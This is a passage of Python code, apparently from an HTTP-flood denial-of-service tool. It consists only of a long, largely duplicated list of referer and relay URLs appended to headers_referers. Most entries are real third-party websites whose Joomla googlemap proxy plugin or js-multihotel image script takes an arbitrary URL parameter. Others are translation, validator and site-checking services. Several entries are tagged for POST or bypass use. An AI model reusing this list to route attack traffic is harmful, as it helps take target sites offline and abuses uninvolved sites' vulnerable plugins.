        headers_referers.append('http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt')
        headers_referers.append('http://web-sniffer.net/?url=')
        headers_referers.append('http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://translate.yandex.ru/translate?srv=yasearch&lang=ru-uk&url=')
        headers_referers.append('http://translate.yandex.ua/translate?srv=yasearch&lang=ru-uk&url=')
        headers_referers.append('http://translate.yandex.net/tr-url/ru-uk.uk/')
        headers_referers.append('http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS')
        headers_referers.append('http://lavori.joomlaskin.it/italyhotels/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=')
        headers_referers.append('http://santaclaradelmar.com/hoteles/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=')
        headers_referers.append('http://www.authentic-luxe-locations.com/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=')
        headers_referers.append('http://www.keenecinemas.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.hotelmonyoli.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://prosperitydrug.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://policlinicamonteabraao.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.vetreriafasanese.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.benawifi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.valleyview.sa.edu.au/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.racersedgekarting.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=?url=')
        headers_referers.append('http://www.villamagnoliarelais.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://worldwide-trips.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://systemnet.com.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://www.netacad.lviv.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://www.veloclub.ru/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://www.virtualsoft.pl/plugins/content/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://gminazdzieszowice.pl/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://fets3.freetranslation.com/?Language=English%2FSpanish&Sequence=core&Url=')
        headers_referers.append('http://www.fare-furore.com/com-line/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.rotisseriesalaberry.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.lbajoinery.com.au/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.seebybike.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.copiflash.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://suttoncenterstore.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://coastalcenter.net/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://whitehousesurgery.org/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.vertexi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.owl.cat/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.sizzlebistro.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://thebluepine.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://donellis.ie/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://validator.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=')
        headers_referers.append('http://validator.w3.org/nu/?doc=')
        headers_referers.append('http://check-host.net/check-http?host=')
        headers_referers.append('http://www.netvibes.com/subscribe.php?url=')
        headers_referers.append('http://www-test.cisel.ch/web/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.sistem5.net/ww/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.fmradiom.hu/palosvorosmart/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.iguassusoft.com/site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://lab.univ-batna.dz/lea/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.computerpoint3.it/cp3/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://hotel-veles.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://klaassienatuinstra.nl/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.google.com/ig/add?feedurl=')
        headers_referers.append('http://anonymouse.org/cgi-bin/anon-www.cgi/')
        headers_referers.append('http://www.google.com/translate?u=')
        headers_referers.append('http://translate.google.com/translate?u=')
        headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
        headers_referers.append('http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=')
        headers_referers.append('http://validator.w3.org/check?uri=')
        headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
        headers_referers.append('http://validator.w3.org/checklink?uri=')
        headers_referers.append('http://qa-dev.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=')
        headers_referers.append('http://www.w3.org/RDF/Validator/ARPServlet?URI=')
        headers_referers.append('http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=')
        headers_referers.append('http://www.w3.org/services/tidy?docAddr=')
        headers_referers.append('http://validator.w3.org/mobile/check?docAddr=')
        headers_referers.append('http://validator.w3.org/p3p/20020128/p3p.pl?uri=')
        headers_referers.append('http://validator.w3.org/p3p/20020128/policy.pl?uri=')
        headers_referers.append('http://online.htmlvalidator.com/php/onlinevallite.php?url=')
        headers_referers.append('http://feedvalidator.org/check.cgi?url=')
        headers_referers.append('http://gmodules.com/ig/creator?url=')
        headers_referers.append('http://www.google.com/ig/adde?moduleurl=')
        headers_referers.append('http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=')
        headers_referers.append('http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=')
        headers_referers.append('http://host-tracker.com/check_page/?furl=')
        headers_referers.append('http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=')
        headers_referers.append('http://www.viewdns.info/ismysitedown/?domain=')
        headers_referers.append('http://www.onlinewebcheck.com/check.php?url=')
        headers_referers.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=')
        headers_referers.append('http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=')
        headers_referers.append('http://streamitwebseries.twww.tv/proxy.php?url=')
        headers_referers.append('http://www.comicgeekspeak.com/proxy.php?url=')
        headers_referers.append('http://feedvalidator.org/check.cgi?url=')
        headers_referers.append('http://gmodules.com/ig/creator?url=')
        headers_referers.append('http://www.google.com/ig/adde?moduleurl=')
        headers_referers.append('http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=')
        headers_referers.append('http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=')
        headers_referers.append('http://host-tracker.com/check_page/?furl=')
        headers_referers.append('http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=')
        headers_referers.append('http://www.onlinewebcheck.com/check.php?url=')
        headers_referers.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=')
        headers_referers.append('http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=')
        headers_referers.append('http://about42.nl/www/showheaders.php;POST;about42.nl.txt')
        headers_referers.append('http://browsershots.org;POST;browsershots.org.txt')
        headers_referers.append('http://streamitwebseries.twww.tv/proxy.php?url=')
        headers_referers.append('http://www.comicgeekspeak.com/proxy.php?url=')
        headers_referers.append('http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt')
        headers_referers.append('http://web-sniffer.net/?url=')
        headers_referers.append('http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://translate.yandex.ru/translate?srv=yasearch&lang=ru-uk&url=')
        headers_referers.append('http://translate.yandex.ua/translate?srv=yasearch&lang=ru-uk&url=')
        headers_referers.append('http://translate.yandex.net/tr-url/ru-uk.uk/')
        headers_referers.append('http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS')
        headers_referers.append('http://lavori.joomlaskin.it/italyhotels/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=')
        headers_referers.append('http://santaclaradelmar.com/hoteles/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=')
        headers_referers.append('http://www.authentic-luxe-locations.com/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=')
        headers_referers.append('http://www.keenecinemas.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.hotelmonyoli.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://prosperitydrug.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://policlinicamonteabraao.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.vetreriafasanese.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.benawifi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.valleyview.sa.edu.au/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.racersedgekarting.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=?url=')
        headers_referers.append('http://www.villamagnoliarelais.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://worldwide-trips.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://systemnet.com.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://www.netacad.lviv.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://www.veloclub.ru/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://www.virtualsoft.pl/plugins/content/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://gminazdzieszowice.pl/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://fets3.freetranslation.com/?Language=English%2FSpanish&Sequence=core&Url=')
        headers_referers.append('http://www.fare-furore.com/com-line/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.rotisseriesalaberry.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.lbajoinery.com.au/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.seebybike.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.copiflash.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://suttoncenterstore.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://coastalcenter.net/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://whitehousesurgery.org/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.vertexi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.owl.cat/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.sizzlebistro.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://thebluepine.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://donellis.ie/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://validator.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=')
        headers_referers.append('http://validator.w3.org/nu/?doc=')
        headers_referers.append('http://check-host.net/check-http?host=')
        headers_referers.append('http://www.netvibes.com/subscribe.php?url=')
        headers_referers.append('http://www-test.cisel.ch/web/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.sistem5.net/ww/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.fmradiom.hu/palosvorosmart/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.iguassusoft.com/site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://lab.univ-batna.dz/lea/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.computerpoint3.it/cp3/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://hotel-veles.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://klaassienatuinstra.nl/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.google.com/ig/add?feedurl=')
        headers_referers.append('http://anonymouse.org/cgi-bin/anon-www.cgi/')
        headers_referers.append('http://www.google.com/translate?u=')
        headers_referers.append('http://translate.google.com/translate?u=')
        headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
        headers_referers.append('http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=')
        headers_referers.append('http://validator.w3.org/check?uri=')
        headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
        headers_referers.append('http://validator.w3.org/checklink?uri=')
        headers_referers.append('http://qa-dev.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=')
        headers_referers.append('http://www.w3.org/RDF/Validator/ARPServlet?URI=')
        headers_referers.append('http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=')
        headers_referers.append('http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=')
        headers_referers.append('http://www.w3.org/services/tidy?docAddr=')
        headers_referers.append('http://validator.w3.org/mobile/check?docAddr=')
        headers_referers.append('http://validator.w3.org/p3p/20020128/p3p.pl?uri=')
        headers_referers.append('http://validator.w3.org/p3p/20020128/policy.pl?uri=')
        headers_referers.append('http://online.htmlvalidator.com/php/onlinevallite.php?url=')
        headers_referers.append('http://feedvalidator.org/check.cgi?url=')
        headers_referers.append('http://gmodules.com/ig/creator?url=')
        headers_referers.append('http://www.google.com/ig/adde?moduleurl=')
        headers_referers.append('http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=')
        headers_referers.append('http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=')
        headers_referers.append('http://host-tracker.com/check_page/?furl=')
        headers_referers.append('http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=')
        headers_referers.append('http://www.viewdns.info/ismysitedown/?domain=')
        headers_referers.append('http://www.onlinewebcheck.com/check.php?url=')
